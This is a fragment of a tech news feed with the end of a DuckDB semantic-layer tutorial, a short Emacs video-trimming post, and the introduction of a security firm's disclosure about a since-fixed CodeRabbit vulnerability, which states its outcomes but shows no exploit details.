</code></pre><p>This gives us a good sense of what we are dealing with. From the <a href="https://www.nyc.gov/assets/tlc/downloads/pdf/data_dictionary_trip_records_hvfhs.pdf">data dictionary</a>, we understand that <code>PULocationID</code> and <code>DOLocationID</code> represent the Taxi zones to be joined with the above zone lookup by the column <code>LocationID</code>.</p><p>Usually what I do next is use the <a href="https://duckdb.org/docs/stable/guides/meta/summarize.html"><code>SUMMARIZE</code> command</a>, which is a DuckDB-specific query type that gives us statistics about the data such as <code>min</code>,&nbsp;<code>max</code>,&nbsp;<code>approx_unique</code>,&nbsp;<code>avg</code>,&nbsp;<code>std</code>,&nbsp;<code>q25</code>,&nbsp;<code>q50</code>,&nbsp;<code>q75</code>,&nbsp;<code>count</code>. This gives us a fast and handy overview of what we are dealing with.</p><section><h4 id="defining-metrics-in-boring-semantic-layer">Defining Metrics in Boring Semantic Layer</h4><p>Next, we can start defining our metrics. Let's start by setting the timestamp and its granularity (required by BSL), followed by the dimensions, which looks something like this:</p><pre><code><span>fhvhv_trips:</span>
  <span>table:</span> <span>trips_tbl</span>
  <span>time_dimension:</span> <span>pickup_datetime</span>
  <span>smallest_time_grain:</span> <span>TIME_GRAIN_SECOND</span>
  
  <span>dimensions:</span>
    <span>hvfhs_license_num:</span> <span>_.hvfhs_license_num</span>
    <span>dispatching_base_num:</span> <span>_.dispatching_base_num</span>
    <span>originating_base_num:</span> <span>_.originating_base_num</span>
    <span>request_datetime:</span> <span>_.request_datetime</span>
    <span>pickup_datetime:</span> <span>_.pickup_datetime</span>
    <span>dropoff_datetime:</span> <span>_.dropoff_datetime</span>
    <span>trip_miles:</span> <span>_.trip_miles</span>
    <span>trip_time:</span> <span>_.trip_time</span>
    <span>base_passenger_fare:</span> <span>_.base_passenger_fare</span>
    <span>tolls:</span> <span>_.tolls</span>
    <span>bcf:</span> <span>_.bcf</span>
    <span>sales_tax:</span> <span>_.sales_tax</span>
    <span>congestion_surcharge:</span> <span>_.congestion_surcharge</span>
    <span>airport_fee:</span> <span>_.airport_fee</span>
    <span>tips:</span> <span>_.tips</span>
    <span>driver_pay:</span> <span>_.driver_pay</span>
    <span>shared_request_flag:</span> <span>_.shared_request_flag</span>
    <span>shared_match_flag:</span> <span>_.shared_match_flag</span>
    <span>access_a_ride_flag:</span> <span>_.access_a_ride_flag</span>
    <span>wav_request_flag:</span> <span>_.wav_request_flag</span>
    <span>wav_match_flag:</span> <span>_.wav_match_flag</span>
</code></pre><p>The <code>pickup_datetime</code> is the time column, with the grain set to seconds, and all other columns are treated as dimensions.</p><p>The interesting part is when we set the measures, which are the calculations, that can become very complex and potentially depend on many layers of existing measures. This is how we define our measures:</p><pre><code>  <span>measures:</span>
    <span>trip_count:</span> <span>_.count()</span>
    <span>avg_trip_miles:</span> <span>_.trip_miles.mean()</span>
    <span>avg_trip_time:</span> <span>_.trip_time.mean()</span>
    <span>avg_base_fare:</span> <span>_.base_passenger_fare.mean()</span>
    <span>total_revenue:</span> <span>_.base_passenger_fare.sum()</span>
    <span>avg_tips:</span> <span>_.tips.mean()</span>
    <span>avg_driver_pay:</span> <span>_.driver_pay.mean()</span>
</code></pre><p>And some more that only aggregate flagged data, such as shared trip or wheelchair requested:</p><pre><code>    <span>shared_trip_rate:</span> <span>(_.shared_match_flag</span> <span>==</span> <span>'Y'</span><span>).mean()</span>
    <span>wheelchair_request_rate:</span> <span>(_.wav_request_flag</span> <span>==</span> <span>'Y'</span><span>).mean()</span>
</code></pre><p>To create a functional dashboard and drill down into different angles, we need <strong>dimensions</strong> that provide more context when querying data. For example, if we want to aggregate on <strong>borough</strong> in New York City, this information is not in the trips data, but in our lookup table, as we saw in the above <code>DESCRIBE</code>. Let's now join this table and use this information.</p><p>First, we define the additional dataset in the YAML as follows:</p><pre><code><span>taxi_zones:</span>
  <span>table:</span> <span>taxi_zones_tbl</span>
  <span>primary_key:</span> <span>LocationID</span>
  
  <span>dimensions:</span>
    <span>location_id:</span> <span>_.LocationID</span>
    <span>borough:</span> <span>_.Borough</span>
    <span>zone:</span> <span>_.Zone</span>
    <span>service_zone:</span> <span>_.service_zone</span>
    
  <span>measures:</span>
    <span>zone_count:</span> <span>_.count()</span>
</code></pre><p>Lastly, we need to join the two datasets. This can be specified like this - added to the <code>fhvhv_trips</code> dataset:</p><pre><code>  <span>joins:</span>
    <span>pickup_zone:</span>
      <span>model:</span> <span>taxi_zones</span>
      <span>type:</span> <span>one</span>
      <span>with:</span> <span>_.PULocationID</span>
</code></pre></section></section><section><h3 id="query-data-through-pythonibis-and-duckdb">Query Data through Python/Ibis and DuckDB</h3><p>Next, we need to set up our execution logic—which is Python code in this case—and use the translation layer Ibis to run DuckDB queries as our SQL engine locally.</p><p>I'll explain the most important steps here, but I'll skip some details—the full script you can find in <a href="https://github.com/sspaeti/semantic-layer-duckdb/blob/main/nyc_taxi.py">nyc_taxi.py</a>. First, we import Ibis and our <code>SemanticModel</code> class from Boring Semantic Layer and we define the datasets and execution engine via Ibis—again, here we use DuckDB and read the dataset directly from <a href="https://aws.amazon.com/cloudfront/">CloudFront</a>:</p><pre><code><span>import</span> ibis
<span>from</span> boring_semantic_layer <span>import</span> SemanticModel

con = ibis.duckdb.connect(<span>":memory:"</span>) <span>#or use `"md:"` for MotherDuck engine</span>
tables = {
    <span>"taxi_zones_tbl"</span>: con.read_csv(<span>"https://d37ci6vzurychx.cloudfront.net/misc/taxi+_zone_lookup.csv"</span>),
    <span>"trips_tbl"</span>: con.read_parquet(<span>"https://d37ci6vzurychx.cloudfront.net/trip-data/fhvhv_tripdata_2025-06.parquet"</span>),
}
</code></pre><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: Scale Up with MotherDuck</span></span>
With one simple change, we can use MotherDuck as the <a href="https://ibis-project.org/backends/duckdb#motherduck">Ibis query engine</a>. Instead of `con = ibis.duckdb.connect(":memory:")`, we can use `con = ibis.duckdb.connect("md:")`
</span><p>Now that we have read the metrics definition we created in the YAML <code>nyc_taxi.yml</code> file above and mapped it to the tables dataset, the boring semantic layer knows which dataset we have and can query it:</p><pre><code>models = SemanticModel.from_yaml(<span>f"nyc_taxi.yml"</span>, tables=tables)

taxi_zones_sm = models[<span>"taxi_zones"</span>] <span>#dataset name from the yaml file</span>
trips_sm = models[<span>"fhvhv_trips"</span>] 
</code></pre><p>And then we define our query as a Python expression with Ibis and BSL—here the <strong>trip volume by pickup borough</strong>:</p><pre><code>expr = trips_sm.query(
  dimensions=[<span>"pickup_zone.borough"</span>],
  measures=[<span>"trip_count"</span>, <span>"avg_trip_miles"</span>, <span>"avg_base_fare"</span>],
  order_by=[(<span>"trip_count"</span>, <span>"desc"</span>)],
  limit=<span>5</span>,
)
</code></pre><p>And we can execute and print it with:</p><pre><code><span>print</span>(expr.execute())
</code></pre><p>The result looks something like this:</p><pre><code>  pickup_zone_borough  trip_count  avg_trip_miles  avg_base_fare
0           Manhattan     7122571        5.296985      33.575738
1            Brooklyn     5433158        4.215820      23.280429
2              Queens     4453220        6.379047      29.778835
3               Bronx     2541614        4.400500      20.313596
4       Staten Island      316533        5.262288      22.200712
</code></pre><p>So what just happened? We defined the dimension (<code>pickup_zone.borough</code>) in which we want to display the measure, configured the three measures to be shown, and specified the order and the number of rows to return with LIMIT.</p><p>The magic is that we can now change the metric in the YAML file, add a CASE WHEN statement, or fix a formatting error all without touching the query or code. Less technical people gain access through a <a href="https://en.wikipedia.org/wiki/Domain-specific_language">DSL (Domain Specific Language)</a> and a separate configuration file, which we can version control, collaborate on, or even utilize LLMs to create new measures and dimensions.</p><p>Ibis gives us the flexibility to do it in a Pythonic way.</p><p>Find more examples such as the popular pickup zones, service zone analysis, revenue analysis by trip distance, and accessibility metrics in the whole script <code>nyc_taxi.py</code> and yaml in <code>nyc_taxi.yml</code>.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 12C16.5523 12 17 12.4477 17 13V18C17 18.5523 16.5523 19 16 19C15.4477 19 15 18.5523 15 18V13C15 12.4477 15.4477 12 16 12Z" fill="#383838"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M14.5013 3.40279C14.9567 3.13875 15.4737 2.99969 16 2.99969C16.5264 2.99969 17.0434 3.13875 17.4987 3.40279C17.9532 3.66638 18.3302 4.04519 18.5916 4.50099C18.592 4.50176 18.5925 4.50253 18.5929 4.50331L29.591 23.5C29.8539 23.9553 29.9925 24.4716 29.993 24.9974C29.9934 25.5231 29.8557 26.0397 29.5937 26.4954C29.3316 26.9512 28.9544 27.3301 28.4998 27.5941C28.0452 27.8582 27.5292 27.9981 27.0035 28L27 28H5.00001L4.99648 28C4.47077 27.9981 3.95477 27.8582 3.50019 27.5941C3.0456 27.3301 2.66838 26.9512 2.40633 26.4954C2.14428 26.0397 2.00658 25.5231 2.00705 24.9974C2.00752 24.4716 2.14612 23.9553 2.40898 23.5L13.4071 4.50331C13.4075 4.50253 13.408 4.50176 13.4084 4.50099C13.6698 4.04519 14.0468 3.66638 14.5013 3.40279ZM14.275 5L15.1404 5.50104L4.14103 24.5C4.14095 24.5001 4.1411 24.4999 4.14103 24.5C4.05355 24.6517 4.00721 24.824 4.00705 24.9991C4.00689 25.1744 4.05279 25.3466 4.14014 25.4985C4.2275 25.6504 4.35323 25.7767 4.50476 25.8647C4.6559 25.9525 4.8274 25.9992 5.00216 26H26.9978C27.1726 25.9992 27.3441 25.9525 27.4953 25.8647C27.6468 25.7767 27.7725 25.6504 27.8599 25.4985C27.9472 25.3466 27.9931 25.1744 27.993 24.9991C27.9928 24.8241 27.9467 24.6522 27.8593 24.5006C27.8592 24.5004 27.8594 24.5008 27.8593 24.5006L16.8571 5.49671C16.7707 5.3457 16.6459 5.22021 16.4954 5.13293C16.3449 5.04565 16.174 4.99969 16 4.99969C15.826 4.99969 15.6551 5.04565 15.5046 5.13293C15.3541 5.22021 15.2293 5.3457 15.1429 5.4967L14.275 5Z" fill="#383838"></path><path d="M16 24C16.8284 24 17.5 23.3284 17.5 22.5C17.5 21.6716 16.8284 21 16 21C15.1716 21 14.5 21.6716 14.5 22.5C14.5 23.3284 15.1716 24 16 24Z" fill="#383838"></path></svg> <span>WARNING<!-- -->: Limitations</span></span>
I <a href="https://github.com/boringdata/boring-semantic-layer/issues/32">wasn't able</a> to join the dataset twice, once for pickup and once for drop-off locations. That's why I only joined it once in this example.
</span></section><section><h3 id="materialization">Materialization</h3><p>If you wish to speed things up and create a <strong>persistent cube</strong>, the option is there with the help of <a href="https://github.com/xorq-labs/xorq">Xorq</a>—example from <a href="https://github.com/boringdata/boring-semantic-layer/blob/main/examples/example_materialize.py">example_materialize.py</a>.</p><pre><code><span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>xorq</span> <span>as</span> <span>xo</span>

<span>from</span> <span>boring_semantic_layer</span> <span>import</span> <span>SemanticModel</span>

<span>df</span> <span>=</span> <span>pd.DataFrame(</span>
    {
        <span>"date":</span> <span>pd.date_range("2025-01-01"</span>, <span>periods=5</span>, <span>freq="D")</span>,
        <span>"region":</span> [<span>"north"</span>, <span>"south"</span>, <span>"north"</span>, <span>"east"</span>, <span>"south"</span>],
        <span>"sales":</span> [<span>100</span>, <span>200</span>, <span>150</span>, <span>300</span>, <span>250</span>],
    }
<span>)</span>

<span>con</span> <span>=</span> <span>xo.connect()</span>
<span>tbl</span> <span>=</span> <span>con.create_table("sales",</span> <span>df)</span>

<span>sales_model</span> <span>=</span> <span>SemanticModel(</span>
    <span>table=tbl,</span>
    <span>dimensions={"region":</span> <span>lambda t:</span> <span>t.region,</span> <span>"date":</span> <span>lambda t:</span> <span>t.date},</span>
    <span>measures={</span>
        <span>"total_sales":</span> <span>lambda t:</span> <span>t.sales.sum(),</span>
        <span>"order_count":</span> <span>lambda t:</span> <span>t.sales.count(),</span>
    <span>},</span>
    <span>time_dimension="date",</span>
    <span>smallest_time_grain="TIME_GRAIN_DAY",</span>
<span>)</span>

<span>cube</span> <span>=</span> <span>sales_model.materialize(</span>
    <span>time_grain="TIME_GRAIN_DAY",</span>
    <span>cutoff="2025-01-04",</span>
    <span>dimensions=["region",</span> <span>"date"</span><span>],</span>
    <span>storage=None,</span>
<span>)</span>

<span>print("Cube</span> <span>model</span> <span>definition:",</span> <span>cube.json_definition)</span>

<span>df_cube</span> <span>=</span> <span>cube.query(</span>
    <span>dimensions=["date",</span> <span>"region"</span><span>],</span> <span>measures=["total_sales",</span> <span>"order_count"</span><span>]</span>
<span>).execute()</span>
</code></pre></section><section><h3 id="more-complex-measures">More Complex Measures</h3><p>This example is relatively simple, but showcases how you can use a simple semantic layer on top of your data lake with DuckDB.</p><p>If you need more advanced measures that are <strong>dependent on each other</strong>, you can imagine how beneficial it would be. The beauty of semantic layers lies in their ability to simply define dependencies on complex measures, eliminating the need to repeat 100 lines of SQL code in your CTE query.</p><p>Obviously, you could use dbt to manage dependencies, but you wouldn't have the ad hoc query capability, the on-the-fly filtering, or nicely defined YAML files that represent your dynamic queries.</p></section><section><h3 id="visualizing">Visualizing</h3><p>Interestingly, the BSL also includes some visualization capabilities with a built-in wrapper around&nbsp;<strong><a href="https://vega.github.io/vega-lite/">Vega-Lite</a></strong>&nbsp;(JSON-based grammar for creating interactive visualizations that provides a declarative approach to chart creation) and its Python wrapper&nbsp;<strong><a href="https://altair-viz.github.io/">Altair</a></strong>.</p><p>Just install with <code>uv add 'boring-semantic-layer[visualization]' altair[all]</code> and you can create a simple visualization. This is a bit extended to create a nice-looking image, but you can imagine this being much shorter with only the title, for example:</p><pre><code><span># Charting example</span>
png_bytes = expr.chart(
  <span>format</span>=<span>"png"</span>,  <span># Add format parameter here</span>
  spec={
	<span>"title"</span>: {
	    <span>"text"</span>: <span>"NYC Taxi Trip Volume by Borough"</span>,
	    <span>"fontSize"</span>: <span>16</span>,
	    <span>"fontWeight"</span>: <span>"bold"</span>,
	    <span>"anchor"</span>: <span>"start"</span>
	},
	<span>"mark"</span>: {
	    <span>"type"</span>: <span>"bar"</span>,
	    <span>"color"</span>: <span>"#2E86AB"</span>,
	    <span>"cornerRadiusEnd"</span>: <span>4</span>
	},
	<span>"encoding"</span>: {
	    <span>"x"</span>: {
		  <span>"field"</span>: <span>"pickup_zone_borough"</span>,
		  <span>"type"</span>: <span>"nominal"</span>,
		  <span>"sort"</span>: <span>"-y"</span>,
		  <span>"title"</span>: <span>"Borough"</span>,
		  <span>"axis"</span>: {
			<span>"labelAngle"</span>: -<span>45</span>,
			<span>"titleFontSize"</span>: <span>12</span>,
			<span>"labelFontSize"</span>: <span>10</span>
		  }
	    },
	    <span>"y"</span>: {
		  <span>"field"</span>: <span>"trip_count"</span>,
		  <span>"type"</span>: <span>"quantitative"</span>,
		  <span>"title"</span>: <span>"Number of Trips"</span>,
		  <span>"axis"</span>: {
			<span>"format"</span>: <span>".2s"</span>,
			<span>"titleFontSize"</span>: <span>12</span>,
			<span>"labelFontSize"</span>: <span>10</span>
		  }
	    }
	},
	<span>"width"</span>: <span>500</span>,
	<span>"height"</span>: <span>350</span>,
	<span>"background"</span>: <span>"#FAFAFA"</span>
  }
)

<span># Save as file</span>
<span>with</span> <span>open</span>(<span>"trip-volume-by-pickup-borough-styled.png"</span>, <span>"wb"</span>) <span>as</span> f:
  f.write(png_bytes)

</code></pre><p>The generated PNG looks like this:
<img alt="image" loading="lazy" decoding="async" data-nimg="fill" sizes="90vw,
                        (min-width: 728px) 800px,
                        (min-width: 960px) 950px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=3840&amp;q=75"></p></section></section>
<section><h2 id="what-if-questions-faq">What If Questions [FAQ]</h2><p>This showed you how to implement a semantic layer with DuckDB and simple tools pragmatically. Moreover, I hope it has provided you with a better understanding of the semantic layer and its appropriate usage.</p><p>Before we wrap up, let's go through the most common questions when it comes to a semantic layer.</p><blockquote>
<p><strong>But why can't we just use a database?</strong></p>
</blockquote><p>The key is the semantic logic layer, abstracting the physical world from the modeling world. This gives you better flexibility to implement what the business wants, rather than what the physical data model can do.</p><p>Try implementing a 'revenue per customer by quarter with year-over-year comparison' across five different BI tools using just database views—you'll most probably end up with five different implementations that drift apart over time.</p><blockquote>
<p><strong>What if we have 100s of metrics, do we need a semantic layer?</strong></p>
</blockquote><p>That's precisely when you <em>need</em> a semantic layer most. Managing 100+ metrics across multiple tools without a single unified view becomes a governance nightmare. Each tool ends up with slightly different calculations, and nobody knows which version is the correct one. A semantic layer gives you one source of truth.</p><blockquote>
<p><strong>Isn't a semantic layer adding too much complexity to the already complex data landscape?</strong></p>
</blockquote><p>Modern data stacks usually come with a handful of tools. A semantic layer most often reduces complexity in a large organization by eliminating metric duplication across those tools.</p><p>The initial setup cost pays for itself when you're not debugging why revenue numbers differ between Tableau and your web app.</p><blockquote>
<p><strong>What if my data changes frequently? Won't the semantic layer become a bottleneck for updates?</strong></p>
</blockquote><p>This is a strength of semantic layers. Unlike pre-computed aggregation tables that need to be reprocessed when source data changes, semantic layers generate queries on demand. Your metrics automatically reflect the latest data because they're calculated in real-time from the source. You only need to update the YAML definitions when business logic changes, not when data refreshes.</p><p>And it can make the process more agile than maintaining dozens of dbt models for different granularities.</p><blockquote>
<p><strong>What if I want to use MCP with it?</strong></p>
</blockquote><p>If you wish to add <a href="https://motherduck.com/blog/faster-data-pipelines-with-mcp-duckdb-ai/">Model Context Protocol (MCP)</a> with Claude Code, for example, the boring semantic layer is built out of the box with it in combination with <a href="https://github.com/xorq-labs/xorq">xorq</a>. Check out a quick showcase in this <a href="https://www.linkedin.com/posts/sven-gonschorek-16b5b0177_i-didnt-expect-connecting-a-data-warehouse-activity-7359199238884417537-En3D">LinkedIn demo</a> by Sven Gonschorek.</p><p>You can also check out the <a href="https://github.com/boringdata/boring-semantic-layer#model-context-protocol-mcp-integration">repo for further information</a> with <code>uv add 'boring-semantic-layer[mcp]'</code>. But in this article, I focus on the semantic layer capabilities first, and the importance of using one.</p><blockquote>
<p><strong>What are other popular semantic layer tools?</strong></p>
</blockquote><p>Cube, AtScale, dbt Semantic Layer, GoodData. Some of these tools are more powerful than others; not all support enhanced security, low-level security, or powerful APIs like Excel or caching. I curate a small list of these tools at <a href="https://www.ssp.sh/brain/semantic-layer#semantic-layer-tools">Semantic Layer Tools</a>.</p><blockquote>
<p><strong>How do I use a semantic layer with MotherDuck?</strong></p>
</blockquote><p>Here are a couple of integrations that work out of the box:</p><ul>
<li>Check out the <a href="https://cube.dev/blog/introducing-duckdb-and-motherduck-integrations">integration</a> with Cube on <a href="https://cube.dev/integrations/motherduck-semantic-layer-with-cube">MotherDuck Semantic Layer with Cube</a>. There's also this <a href="https://youtu.be/z_nb-31Y30I?si=oVtuLmgq4sFckXar">webinar</a>.</li>
<li><a href="https://www.gooddata.com/blog/gooddata-and-motherduck-take-flight-together/">Boost Efficiency</a> with GoodData integration</li>
</ul></section>
<section><h2 id="conclusion">Conclusion</h2><p>I hope you enjoyed this article, which provided a practical illustration of how to use a semantic layer with DuckDB and MotherDuck.</p><p>The beauty of semantic layers lies in their empowering approach to working with metrics, complemented by advanced features, but also with a simple solution like we implemented here. With just a YAML file and a few lines of Python, we've created a system that can serve consistent metrics across any tool in your data stack. Whether you're building dashboards, training ML models, or enabling AI assistants, your business logic stays in one place while your analytics capabilities grow everywhere else.</p><p>Start with something simple, like the Boring Semantic Layer and DuckDB, and prove the value by addressing your most painful metric inconsistencies. Then, scale from there.</p><p>Future you and your coworkers will thank you when "revenue" and "profit" mean the same thing in every tool, all the time.</p></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Emacs as your video-trimming tool (270 pts)]]></title>
            <link>https://xenodium.com/emacs-as-your-video-trimming-tool</link>
            <guid>44953316</guid>
            <pubDate>Tue, 19 Aug 2025 16:22:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xenodium.com/emacs-as-your-video-trimming-tool">https://xenodium.com/emacs-as-your-video-trimming-tool</a>, See on <a href="https://news.ycombinator.com/item?id=44953316">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Marcin ‘mbork’ Borkowski has a nice post showing us how he <a href="https://mbork.pl/2025-08-18_Cutting_clips_from_videos_with_Emacs">trims video clips from our beloved editor</a>. Trimming clips is something I do from time to time, specially when posting a screencast of sorts. Since I don't need much, I typically resort to QuickTime Player's trimming functionality that ships with macOS. While it does the job, ever since I <a href="https://xenodium.com/seek-and-you-shall-find">added a "graphical" seeker to Ready Player Mode</a>, I had been meaning to build a simple video trimming tool of sorts. Marcin's post was just about the right nudge I needed to also give this a go, yielding <a href="https://github.com/xenodium/dotsies/blob/main/emacs/ar/video-trimmer.el">video-trimmer-mode</a>.</p><p>The solution relies on <a href="https://www.youtube.com/watch?v=9kaIXkImCAM">ffmpeg</a> to do the heavy lifting and is roughly 300 lines of code. I was going to share the entire snippet in this post, though may as well point you to its <a href="https://github.com/xenodium/dotsies/blob/main/emacs/ar/video-trimmer.el">location in my Emacs config repo</a>. I'm likely to tweak it, so you may as well take a look at its latest incarnation.</p><section>
      <p>powered by <a href="https://lmno.lol/">LMNO.lol</a></p>
      <p><a href="https://lmno.lol/blog/privacy-policy">privacy policy</a> · <a href="https://lmno.lol/blog/terms-of-service">terms of service</a></p>
    </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How we exploited CodeRabbit: From simple PR to RCE and write access on 1M repos (636 pts)]]></title>
            <link>https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</link>
            <guid>44953032</guid>
            <pubDate>Tue, 19 Aug 2025 15:55:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/">https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/</a>, See on <a href="https://news.ycombinator.com/item?id=44953032">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

		
<p>In this blog post, we explain how we got remote code execution (RCE) on CodeRabbit’s production servers, leaked their API tokens and secrets, how we could have accessed their PostgreSQL database, and how we obtained read and write access to 1 million code repositories, including private ones.</p>



<p>This blog post is a detailed write-up of one of the vulnerabilities we disclosed at <a href="https://research.kudelskisecurity.com/2025/08/07/hack-to-the-future-slides-and-content/">Black Hat USA</a> this year. The details provided in this post are meant to demonstrate how these security issues can manifest and be exploited in the hopes that others can avoid similar issues. This is not meant to shame any particular vendor; it happens to everyone. Security is a process, and avoiding vulnerabilities takes constant vigilance. </p>



<p><strong>Note:</strong> <strong>The security issues documented in this post were remediated in January of 2025.</strong> See the Responsible Disclosure section for more details. </p>



<h2>Introduction</h2>



<p>Last December, I spoke at 38C3 in Hamburg and <a href="https://research.kudelskisecurity.com/2024/08/29/careful-where-you-code-multiple-vulnerabilities-in-ai-powered-pr-agent/">covered 2 security flaws</a> I discovered in Qodo Merge. After getting off the stage, someone came to me and asked whether I had looked at other AI code review tools, such as CodeRabbit. I thanked them and said this would be a great target to have a look at. Fast forward a couple of weeks, and here I am, having a look at their security.</p>



<h2>What is CodeRabbit?</h2>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png"><img data-attachment-id="20091" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/2025-01-17-144947_2338x669_scrot/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png" data-orig-size="2338,669" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2025-01-17-144947_2338x669_scrot" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=840" width="1024" height="293" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/2025-01-17-144947_2338x669_scrot.png?w=1024" alt=""></a><figcaption>CodeRabbit front page</figcaption></figure>



<p><a href="https://www.coderabbit.ai/">CodeRabbit</a> is an AI code review tool. Their website mentions it’s the most installed <a href="https://github.com/marketplace?type=apps&amp;category=ai-assisted">AI app on GitHub</a> &amp; Gitlab, with 1 million repositories in review and 5 million pull requests reviewed.</p>



